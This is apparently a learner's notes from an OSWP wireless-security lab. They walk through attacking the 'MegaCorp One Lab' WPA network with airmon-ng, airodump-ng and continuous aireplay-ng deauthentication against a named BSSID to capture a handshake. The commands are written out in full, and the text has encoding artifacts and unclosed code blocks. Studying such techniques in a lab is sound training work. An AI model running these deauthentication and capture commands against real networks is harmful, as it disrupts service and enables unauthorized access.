We will begin by gathering information about our target. We need to runÂ `sudo airmon-ng check kill`Â to kill any process that might interfere with our wireless card. Once that is done, we'll runÂ `sudo airmon-ng start wlan0`Â to start in monitor mode.

```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[16Apr2025 01:42:12]-[/home/kali/SUT/OSWP]
â””â”€# sudo airmon-ng check kill    

Killing these processes:

    PID Name
 477475 wpa_supplicant
```

Next, we can use our new interface `(wlan0mon)` withÂ airodump-ngÂ to capture information about the clients and APs around us. We'll useÂ `-w`Â to set the dump file prefix andÂ `--output-forma`tÂ to set the output format to be a pcap.

`what should be shown` - i am getting nothing because i need a new adapter.
```bash
kali@kali:~$ sudo airodump-ng -w discovery --output-format pcap wlan0mon

The output is sent to the terminal, but it is also saved inÂ `discovery-01.cap`.

We will be targeting` "MegaCorp One Lab"`, which is a WPA-PSK network on channel 11 with three clients. It doesn't matter much if it's WPA1 or WPA2, since we will be using an open network on the same channel to trick clients into connecting to us.

We will need to `intercept` a handshake from one of the clients. To do so, we can either wait for one to connect or reconnect, or we can useÂ aireplay-ngÂ to deauthenticate clients. This will force them to reconnect and should allow us to capture the handshake.


```bash
kali@kali:~$ sudo aireplay-ng -0 0 -a 00:0E:08:90:3A:5F wlan0mon

Shortly after this, airmon-ng captures a "MegaCorp One Lab" handshake which is now saved in ourÂ `discovery-01.capÂ file`.

```bash

This will be important to use later on in our attack.
